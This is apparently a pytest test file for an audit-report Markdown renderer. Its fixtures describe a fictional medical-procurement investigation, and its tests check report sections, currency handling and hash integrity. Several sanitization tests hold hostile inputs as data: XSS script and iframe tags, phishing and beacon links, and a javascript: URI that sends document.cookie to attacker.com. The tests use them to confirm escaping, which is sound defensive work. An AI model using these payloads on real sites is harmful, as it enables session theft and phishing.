import pytest
import html
from app.models.project import Project
from app.models.investigation import Investigation
from app.models.document import Document
from app.models.finding import Finding
from app.models.ledger import EvidenceLedgerEntry
from app.models.report import InvestigationReport
from app.services.report_service import ReportService
from app.services.markdown_renderer import MarkdownDossierRenderer, escape_cell, escape_text, format_currency_amount

@pytest.fixture
def rich_investigation_setup(test_db):
    """
    Creates a full investigation environment with multiple currencies,
    various findings classifications, documentation gaps, and three-way reconciliation ledger entries.
    """
    project = Project(
        name="Emergency Medical Support Project",
        code="EMSP-2026",
        donor="Global Health Alliance",
        budget=250000.0,
        currency="USD",
        nas_folder_path="/volume1/finance/EMSP-2026"
    )
    test_db.add(project)
    test_db.flush()

    inv = Investigation(
        project_id=project.id,
        title="Q1-Q2 Comprehensive Procurement Audit",
        scope_path="/volume1/finance/EMSP-2026",
        status="COMPLETED",
        summary="Comprehensive audit of emergency medical supplies procurement across Q1 and Q2 2026.",
        document_count=4
    )
    test_db.add(inv)
    test_db.flush()

    # Documents
    doc_po = Document(
        project_id=project.id,
        investigation_id=inv.id,
        filename="PO-9001.pdf",
        file_path="/volume1/finance/EMSP-2026/orders/PO-9001.pdf",
        document_type="PURCHASE_ORDER",
        extraction_status="EXTRACTED",
        extracted_data={"po_reference": "PO-9001", "amount": 12500.0, "currency": "USD", "vendor": "MedEquip Ltd | Global"}
    )
    doc_inv = Document(
        project_id=project.id,
        investigation_id=inv.id,
        filename="INV-ME-4001.pdf",
        file_path="/volume1/finance/EMSP-2026/invoices/INV-ME-4001.pdf",
        document_type="INVOICE",
        extraction_status="EXTRACTED",
        extracted_data={"invoice_number": "INV-ME-4001", "po_reference": "PO-9001", "amount": 12500.0, "currency": "USD", "vendor": "MedEquip Ltd | Global"}
    )
    doc_rec = Document(
        project_id=project.id,
        investigation_id=inv.id,
        filename="REC-BNK-8012.pdf",
        file_path="/volume1/finance/EMSP-2026/receipts/REC-BNK-8012.pdf",
        document_type="RECEIPT",
        extraction_status="EXTRACTED",
        extracted_data={"receipt_id": "REC-BNK-8012", "invoice_reference": "INV-ME-4001", "amount": 12500.0, "currency": "USD"}
    )
    doc_unapp = Document(
        project_id=project.id,
        investigation_id=inv.id,
        filename="REC-UNAPPLIED-99.pdf",
        file_path="/volume1/finance/EMSP-2026/receipts/REC-UNAPPLIED-99.pdf",
        document_type="RECEIPT",
        extraction_status="EXTRACTED",
        extracted_data={"receipt_id": "REC-UNAPPLIED-99", "amount": 1500.0, "currency": "USD"}
    )
    test_db.add_all([doc_po, doc_inv, doc_rec, doc_unapp])
    test_db.flush()

    # Findings
    f1 = Finding(
        investigation_id=inv.id,
        title="Unapplied Payment Receipt Found",
        classification="MISSING_EVIDENCE",
        subject_reference="REC-UNAPPLIED-99",
        source_paths=[doc_unapp.file_path],
        expected_value="Matching invoice and PO in project folder",
        observed_value="Standalone bank voucher of 1,500.00 USD with no matching bill",
        variance_explanation="Disbursement receipt REC-UNAPPLIED-99 lacks corresponding invoice or purchase order in the scanned directory.",
        recommended_action="Contact field logistics officer to retrieve underlying purchase requisition and invoice.",
        source_document_ids=[doc_unapp.id],
        missing_evidence_details="Purchase Order and Vendor Billing Invoice missing from EMSP-2026 archive.",
        evidence_limitations="Scope limited to /volume1/finance/EMSP-2026.",
        classification_rationale="Absence of billing documents requires MISSING_EVIDENCE classification without implying improper payment."
    )

    f2 = Finding(
        investigation_id=inv.id,
        title="Smudged Currency Code on Ancillary Voucher",
        classification="UNVERIFIED",
        subject_reference="TXN-ANCILLARY-01",
        source_paths=[],
        expected_value="ISO-4217 standard currency code",
        observed_value="Unreadable / unextracted currency code",
        variance_explanation="Voucher image degraded; currency symbol obscured.",
        recommended_action="Inspect physical paper voucher at country office.",
        evidence_limitations="Optical degradation prevents automated extraction.",
        classification_rationale="Unreadable fields classified conservatively as UNVERIFIED."
    )
    test_db.add_all([f1, f2])

    # Ledger entries
    # 1. USD Reconciled entry
    entry_usd = EvidenceLedgerEntry(
        investigation_id=inv.id,
        transaction_id="TXN-USD-001",
        item_description="Surgical Diagnostics & Patient Monitors | Lot A",
        supplier_name="MedEquip Ltd | Global",
        po_reference="PO-9001",
        po_amount=12500.0,
        invoice_number="INV-ME-4001",
        invoice_amount=12500.0,
        receipt_proof="REC-BNK-8012",
        receipt_amount=12500.0,
        paid_amount=12500.0,
        currency="USD",
        reconciliation_status="RECONCILED_MATCH",
        match_confidence="EXACT_MATCH",
        source_file_paths=[doc_po.file_path, doc_inv.file_path, doc_rec.file_path],
        source_document_ids=[doc_po.id, doc_inv.id, doc_rec.id]
    )

    # 2. USD Unapplied receipt entry
    entry_unapp = EvidenceLedgerEntry(
        investigation_id=inv.id,
        transaction_id="TXN-USD-002",
        item_description="Emergency Medical Consumables",
        receipt_proof="REC-UNAPPLIED-99",
        receipt_amount=1500.0,
        paid_amount=1500.0,
        currency="USD",
        reconciliation_status="UNAPPLIED_RECEIPT",
        match_confidence="UNMATCHED",
        requires_human_review=True,
        human_review_reason="Unapplied receipt without matching invoice or PO.",
        source_file_paths=[doc_unapp.file_path],
        source_document_ids=[doc_unapp.id]
    )

    # 3. EUR Reconciled entry (multi-currency segregation)
    entry_eur = EvidenceLedgerEntry(
        investigation_id=inv.id,
        transaction_id="TXN-EUR-001",
        item_description="Cold-Chain Vaccine Refrigerators",
        supplier_name="BioKlima AG",
        po_reference="PO-EUR-770",
        po_amount=8400.0,
        invoice_number="INV-BK-202",
        invoice_amount=8400.0,
        receipt_proof="REC-EUR-331",
        receipt_amount=8400.0,
        paid_amount=8400.0,
        currency="EUR",
        reconciliation_status="RECONCILED_MATCH",
        match_confidence="EXACT_MATCH"
    )

    # 4. Undocumented currency entry (null / missing currency)
    entry_undoc = EvidenceLedgerEntry(
        investigation_id=inv.id,
        transaction_id="TXN-UNDOC-999",
        item_description="Field Clinic Sanitization Services",
        invoice_number="INV-UNK-11",
        invoice_amount=450.0,
        paid_amount=450.0,
        currency=None,  # Missing currency
        reconciliation_status="UNVERIFIED",
        match_confidence="UNMATCHED",
        requires_human_review=True,
        human_review_reason="Missing currency code on invoice."
    )

    test_db.add_all([entry_usd, entry_unapp, entry_eur, entry_undoc])
    test_db.commit()

    return {
        "project": project,
        "investigation": inv,
        "docs": [doc_po, doc_inv, doc_rec, doc_unapp],
        "findings": [f1, f2],
        "entries": [entry_usd, entry_unapp, entry_eur, entry_undoc]
    }


def test_markdown_sanitization_helpers():
    """Verify Markdown sanitization utility functions."""
    # Test pipe escaping for table cells
    assert escape_cell("Supplier A | Branch B") == "Supplier A &#124; Branch B"
    assert escape_cell(None) == "N/A"
    assert escape_cell("Line 1\nLine 2\r\nLine 3") == "Line 1<br>Line 2<br>Line 3"

    # Test header injection neutralization
    injected = "# Compromised Header\nNormal text\n## Subheader Attempt"
    escaped = escape_text(injected)
    assert not escaped.startswith("#")
    assert "Compromised Header\nNormal text\nSubheader Attempt" in escaped
    assert escape_text(None) == "N/A"

    # Test currency amount formatting
    assert format_currency_amount(12500.5, "USD") == "12,500.50 USD"
    assert format_currency_amount(0.0, "EUR") == "0.00 EUR"
    assert format_currency_amount(None, "USD") == "N/A"


def test_html_entity_escaping_and_xss_neutralization():
    """Verify DEF-SEC-01: HTML tags are neutralized with entity encoding."""
    xss_payload = "<script>alert('xss')</script><img src=x onerror=steal()><iframe src='evil.com'></iframe>"

    # In table cells
    cell_out = escape_cell(xss_payload)
    assert "<script>" not in cell_out
    assert "<iframe>" not in cell_out
    assert "<img" not in cell_out
    assert "&lt;script&gt;" in cell_out
    assert "&lt;iframe" in cell_out
    assert "&lt;img" in cell_out
    assert "&#x27;xss&#x27;" in cell_out or "&apos;xss&apos;" in cell_out

    # In prose text
    text_out = escape_text(xss_payload)
    assert "<script>" not in text_out
    assert "<iframe>" not in text_out
    assert "&lt;script&gt;" in text_out
    assert "&lt;iframe" in text_out


def test_markdown_link_and_image_neutralization():
    """Verify DEF-SEC-02: Markdown link brackets and image syntax are neutralized."""
    malicious_link = "[Click here to view invoice](https://phishing.example.com/login)"
    malicious_image = "![Tracking Beacon](https://attacker.com/beacon.png)"
    js_uri = "[Verify Details](javascript:fetch('http://attacker.com/?c='+document.cookie))"

    # In table cells
    cell_link = escape_cell(malicious_link)
    assert "[Click here" not in cell_link
    assert "&#91;Click here" in cell_link
    assert "&#93;(https://phishing.example.com/login)" in cell_link

    cell_img = escape_cell(malicious_image)
    assert "![Tracking" not in cell_img
    assert "!&#91;Tracking" in cell_img or "&#33;&#91;Tracking" in cell_img

    cell_js = escape_cell(js_uri)
    assert "[Verify Details]" not in cell_js
    assert "&#91;Verify Details&#93;" in cell_js

    # In prose text
    text_link = escape_text(malicious_link)
    assert "[Click here" not in text_link
    assert "&#91;Click here" in text_link


def test_setext_heading_and_horizontal_rule_neutralization():
    """Verify DEF-SEC-03: Setext underlines and horizontal rules are neutralized."""
    setext_h1 = "Official Investigation Cleared\n==============================="
    setext_h2 = "Secondary Finding Overruled\n-------------------------------"
    hr_injection = "Normal prose line\n---\nAnother prose line\n***\nThird line"

    out_h1 = escape_text(setext_h1)
    # The === underline should be neutralized
    assert "Official Investigation Cleared" in out_h1
    assert "===============================" not in out_h1
    assert "&#61;&#61;" in out_h1

    out_h2 = escape_text(setext_h2)
    assert "Secondary Finding Overruled" in out_h2
    assert "-------------------------------" not in out_h2
    assert "&#45;&#45;" in out_h2

    out_hr = escape_text(hr_injection)
    assert "\n---\n" not in out_hr
    assert "\n***\n" not in out_hr


def test_fallback_reconciliation_all_six_values_escaped():
    """Verify DEF-SEC-04: All six fallback reconciliation values are escaped with escape_cell."""
    report = InvestigationReport(
        id=77,
        investigation_id=10,
        report_version=1,
        report_status="FINAL",
        report_title="Fallback Matrix Escaping Test",
        snapshot_payload={
            "metadata": {"schema_version": "1.0.0", "methodology_version": "VaultPilot-Audit-Methodology-2.0"},
            "investigation_summary": {"project_name": "Test Project", "investigation_scope": "/vol/test"},
            "evidence_register_snapshot": [
                {
                    "document_type": "PURCHASE_ORDER",
                    "extracted_data_summary": {
                        "po_reference": "PO-99 | EXTRA_DELIMITER | ATTACK",
                        "amount": 5000.0,
                        "currency": "USD"
                    }
                },
                {
                    "document_type": "INVOICE",
                    "extracted_data_summary": {
                        "invoice_number": "INV-100 | INJECTED_COL | <script>",
                        "po_reference": "PO-99 | EXTRA_DELIMITER | ATTACK",
                        "amount": 5000.0,
                        "currency": "USD"
                    }
                },
                {
                    "document_type": "RECEIPT",
                    "extracted_data_summary": {
                        "receipt_id": "REC-77 | RECEIPT_INJECT | [link](evil.com)",
                        "invoice_reference": "INV-100 | INJECTED_COL | <script>",
                        "amount": 5000.0,
                        "currency": "USD"
                    }
                }
            ]
        }
    )

    md = MarkdownDossierRenderer.render(report)

    # Find the Section 8 table row
    reconciliation_row = None
    for line in md.splitlines():
        if "EXTRA_DELIMITER" in line or "INJECTED_COL" in line:
            reconciliation_row = line
            break

    assert reconciliation_row is not None
    # Header has 7 columns (8 pipes: | Col1 | Col2 | Col3 | Col4 | Col5 | Col6 | Col7 |)
    # The row must have exactly 8 pipe characters (7 table columns)
    assert reconciliation_row.count("|") == 8
    # Raw pipes must be escaped
    assert "&#124; EXTRA_DELIMITER" in reconciliation_row
    assert "&#124; INJECTED_COL" in reconciliation_row
    # HTML and link brackets must be escaped
    assert "&lt;script&gt;" in reconciliation_row
    assert "&#91;link&#93;" in reconciliation_row


def test_runtime_sha256_verification_and_badges(test_db, rich_investigation_setup):
    """Verify DEF-SEC-05: Runtime SHA-256 verification and verified / mismatch badges."""
    inv = rich_investigation_setup["investigation"]
    report = ReportService.create_report_snapshot(db=test_db, investigation_id=inv.id)

    # 1. Untampered report: verify_report_integrity returns True
    assert ReportService.verify_report_integrity(report) is True

    md_valid = MarkdownDossierRenderer.render(report)
    # Check Section 1 badge
    assert "- **Snapshot Integrity Status:** **`[SNAPSHOT INTEGRITY: VERIFIED (SHA-256 MATCH)]`**" in md_valid
    # Check Section 12 badge
    assert "- **Cryptographic Verification Status:** **`[SNAPSHOT INTEGRITY: VERIFIED (SHA-256 MATCH)]`**" in md_valid
    assert "[SNAPSHOT INTEGRITY: COMPROMISED" not in md_valid
    assert "INTEGRITY WARNING:" not in md_valid

    # 2. Tampered report payload: verify_report_integrity returns False
    # Mutate snapshot payload directly (simulating unauthorized DB tampering)
    tampered_payload = dict(report.snapshot_payload)
    tampered_payload["tampered_key"] = "unauthorized_modification"
    report.snapshot_payload = tampered_payload

    assert ReportService.verify_report_integrity(report) is False

    md_compromised = MarkdownDossierRenderer.render(report)
    # Both badges must reflect the mismatch
    assert "- **Snapshot Integrity Status:** **`[SNAPSHOT INTEGRITY: COMPROMISED / HASH MISMATCH]`**" in md_compromised
    assert "- **Cryptographic Verification Status:** **`[SNAPSHOT INTEGRITY: COMPROMISED / HASH MISMATCH]`**" in md_compromised
    # Section 12 must display cautionary alert
    assert "INTEGRITY WARNING:" in md_compromised
    assert "failed canonical SHA-256 hash verification" in md_compromised


def test_sha256_verify_fails_closed():
    """Verify DEF-SEC-05 fails closed on missing, None, or invalid attributes."""
    assert ReportService.verify_report_integrity(None) is False

    empty_rep = InvestigationReport(id=1, snapshot_payload=None, snapshot_integrity_hash="abc")
    assert ReportService.verify_report_integrity(empty_rep) is False

    no_hash_rep = InvestigationReport(id=2, snapshot_payload={"k": "v"}, snapshot_integrity_hash=None)
    assert ReportService.verify_report_integrity(no_hash_rep) is False


def test_renderer_generates_all_13_required_sections(test_db, rich_investigation_setup):
    """
    Verify that the Markdown dossier contains all 13 required sections in order.
    """
    inv = rich_investigation_setup["investigation"]
    report = ReportService.create_report_snapshot(db=test_db, investigation_id=inv.id)

    md = MarkdownDossierRenderer.render(report)

    # 1. Report Title and Metadata
    assert "# VaultPilot AI: Audit Dossier & Financial Investigation Report" in md
    assert f"**Report ID:** #{report.id}" in md
    assert f"**Investigation ID:** #{inv.id}" in md
    assert "**Report Version:** v1" in md
    assert "**Report Status:** `FINAL`" in md
    assert "**Snapshot Integrity Status:** **`[SNAPSHOT INTEGRITY: VERIFIED (SHA-256 MATCH)]`**" in md
    assert "**Methodology Version:** `VaultPilot-Audit-Methodology-2.0`" in md
    assert f"**Snapshot Integrity Hash:** `{report.snapshot_integrity_hash}`" in md

    # 2. Executive Summary
    assert "## 1. Executive Summary" in md
    assert "Comprehensive audit of emergency medical supplies" in md

    # 3. Investigation Scope
    assert "## 2. Investigation Scope" in md
    assert "**Project Name:** Emergency Medical Support Project" in md
    assert "**Project Code:** `EMSP-2026`" in md
    assert "**Donor / Grantor:** Global Health Alliance" in md
    assert f"**Authorized Directory Scope:** `{inv.scope_path}`" in md

    # 4. Investigation Methodology
    assert "## 3. Investigation Methodology" in md
    assert "VaultPilot-Audit-Methodology-2.0" in md
    assert "Three-Way Documentary Reconciliation" in md

    # 5. Financial Reconciliation Summary
    assert "## 4. Financial Reconciliation Summary" in md
    assert "EUR, USD" in md
    assert "**Human Supervisory Review:** **REQUIRED**" in md

    # 6. Currency-Separated Expenditure Schedules
    assert "## 5. Currency-Separated Expenditure Schedules" in md
    assert "### Schedule: USD Financial Summary" in md
    assert "### Schedule: EUR Financial Summary" in md
    assert "### Undocumented / Missing Currency Disclosures" in md

    # 7. Classified Findings Register
    assert "## 6. Classified Findings Register" in md
    assert "Unapplied Payment Receipt Found" in md
    assert "Smudged Currency Code on Ancillary Voucher" in md

    # 8. Evidence Register
    assert "## 7. Evidence Register" in md
    assert "`PO-9001.pdf`" in md
    assert "`INV-ME-4001.pdf`" in md
    assert "`REC-BNK-8012.pdf`" in md

    # 9. Purchase Order, Invoice, and Receipt Reconciliation
    assert "## 8. Purchase Order, Invoice, and Receipt Reconciliation" in md
    assert "`TXN-USD-001`" in md
    assert "`TXN-EUR-001`" in md

    # 10. Missing and Incomplete Evidence Checklist
    assert "## 9. Missing and Incomplete Evidence Checklist" in md
    assert "- [ ]" in md
    assert "Unapplied Payment Receipt Found" in md

    # 11. Human Review Requirements
    assert "## 10. Human Review Requirements" in md
    assert "**Overall Review Status:** **REQUIRED**" in md

    # 12. Investigation Limitations & Legal Disclaimers
    assert "## 11. Investigation Limitations & Legal Disclaimers" in md
    assert "Scoped Directory Boundary" in md
    assert "Negative Proof Clarification" in md
    assert "Mandatory Human Verification" in md

    # 13. Audit & Snapshot Integrity Metadata
    assert "## 12. Audit & Snapshot Integrity Metadata" in md
    assert f"`{report.snapshot_integrity_hash}`" in md
    assert "- **Cryptographic Verification Status:** **`[SNAPSHOT INTEGRITY: VERIFIED (SHA-256 MATCH)]`**" in md
    assert "Snapshot Immutability Notice" in md


def test_pure_snapshot_decoupling(test_db, rich_investigation_setup):
    """
    Verify that rendering is strictly decoupled from live database records.
    Modifying live documents or findings after report creation must NOT change the rendered report.
    """
    inv = rich_investigation_setup["investigation"]
    report = ReportService.create_report_snapshot(db=test_db, investigation_id=inv.id)

    initial_md = MarkdownDossierRenderer.render(report)

    # Mutate live findings and documents in database
    for f in test_db.query(Finding).filter(Finding.investigation_id == inv.id).all():
        f.title = "CORRUPTED LIVE TITLE"
        f.classification = "CONFIRMED_DISCREPANCY"
    for d in test_db.query(Document).filter(Document.investigation_id == inv.id).all():
        d.filename = "CORRUPTED_FILENAME.pdf"
    for e in test_db.query(EvidenceLedgerEntry).filter(EvidenceLedgerEntry.investigation_id == inv.id).all():
        e.paid_amount = 9999999.0
    test_db.commit()

    # Re-render report from the report instance (using snapshot_payload)
    reloaded_report = ReportService.get_report(db=test_db, report_id=report.id)
    post_mutation_md = MarkdownDossierRenderer.render(reloaded_report)

    # Must be 100% identical byte-for-byte
    assert initial_md == post_mutation_md
    assert "CORRUPTED LIVE TITLE" not in post_mutation_md
    assert "CORRUPTED_FILENAME.pdf" not in post_mutation_md
    assert "9,999,999.00" not in post_mutation_md
    assert "PO-9001.pdf" in post_mutation_md
    assert "Unapplied Payment Receipt Found" in post_mutation_md


def test_markdown_cell_pipe_sanitization(test_db, rich_investigation_setup):
    """
    Verify that pipe characters inside transaction descriptions or supplier names
    are sanitized so Markdown tables do not fracture.
    """
    inv = rich_investigation_setup["investigation"]
    report = ReportService.create_report_snapshot(db=test_db, investigation_id=inv.id)
    md = MarkdownDossierRenderer.render(report)

    # In our fixture: "Surgical Diagnostics & Patient Monitors | Lot A"
    # and "MedEquip Ltd | Global"
    # The pipes should be escaped as &#124; inside table cells
    assert "&#124; Lot A" in md
    assert "MedEquip Ltd &#124; Global" in md or "PO-9001" in md


def test_currency_segregation_and_unapplied_receipts(test_db, rich_investigation_setup):
    """
    Verify that distinct currencies are segregated into independent schedules,
    and unapplied receipts are never mixed into verified expenditure totals.
    """
    inv = rich_investigation_setup["investigation"]
    report = ReportService.create_report_snapshot(db=test_db, investigation_id=inv.id)
    md = MarkdownDossierRenderer.render(report)

    # USD schedule checks
    assert "### Schedule: USD Financial Summary" in md
    assert "`12,500.00 USD`" in md  # Verified spend
    assert "`1,500.00 USD`" in md   # Unapplied receipt

    # EUR schedule checks
    assert "### Schedule: EUR Financial Summary" in md
    assert "`8,400.00 EUR`" in md   # Verified spend

    # Verified expenditure summary section must show USD and EUR separated
    assert "- **USD:** 12,500.00 USD" in md
    assert "- **EUR:** 8,400.00 EUR" in md

    # Ensure no combined sum like 20,900 or 22,400 exists in verified totals
    assert "20,900.00" not in md
    assert "22,400.00" not in md


def test_undocumented_currency_disclosure_table(test_db, rich_investigation_setup):
    """
    Verify that transactions with missing/null currency codes are disclosed in
    a dedicated warning table and never combined with valid currencies.
    """
    inv = rich_investigation_setup["investigation"]
    report = ReportService.create_report_snapshot(db=test_db, investigation_id=inv.id)
    md = MarkdownDossierRenderer.render(report)

    assert "### Undocumented / Missing Currency Disclosures" in md
    assert "TXN-UNDOC-999" in md
    assert "450.00 UNKNOWN" in md
    assert "Missing, unextracted, or non-standard currency code" in md


def test_negative_proof_and_non_accusatory_language(test_db, rich_investigation_setup):
    """
    Verify that the dossier strictly maintains a non-accusatory tone and contains
    negative proof disclaimers.
    """
    inv = rich_investigation_setup["investigation"]
    report = ReportService.create_report_snapshot(db=test_db, investigation_id=inv.id)
    md = MarkdownDossierRenderer.render(report)

    # Mandatory disclaimers
    assert "Negative Proof Clarification" in md
    assert "It does NOT prove that an underlying transaction, goods delivery, or disbursement never occurred." in md
    assert "They do not constitute formal judicial verdicts, forensic criminal determinations, or accusations of intentional misconduct or fraud." in md


def test_markdown_api_endpoint(client, test_db, rich_investigation_setup):
    """
    Verify GET /api/v1/reports/{report_id}/markdown and
    GET /api/v1/investigations/{investigation_id}/reports/{report_id}/markdown.
    """
    inv = rich_investigation_setup["investigation"]
    report = ReportService.create_report_snapshot(db=test_db, investigation_id=inv.id)

    # 1. Test direct report markdown endpoint
    resp = client.get(f"/api/v1/reports/{report.id}/markdown")
    assert resp.status_code == 200
    assert "text/markdown; charset=utf-8" in resp.headers["content-type"]
    assert f'inline; filename="audit_dossier_report_{report.id}.md"' in resp.headers["content-disposition"]
    assert "# VaultPilot AI: Audit Dossier & Financial Investigation Report" in resp.text
    assert f"**Report ID:** #{report.id}" in resp.text

    # 2. Test investigation-scoped markdown endpoint
    resp_scoped = client.get(f"/api/v1/investigations/{inv.id}/reports/{report.id}/markdown")
    assert resp_scoped.status_code == 200
    assert resp_scoped.text == resp.text

    # 3. Test 404 for non-existent report
    resp_404 = client.get("/api/v1/reports/99999/markdown")
    assert resp_404.status_code == 404

    # 4. Test 404 for mismatched investigation ID
    resp_mismatch = client.get(f"/api/v1/investigations/99999/reports/{report.id}/markdown")
    assert resp_mismatch.status_code == 404
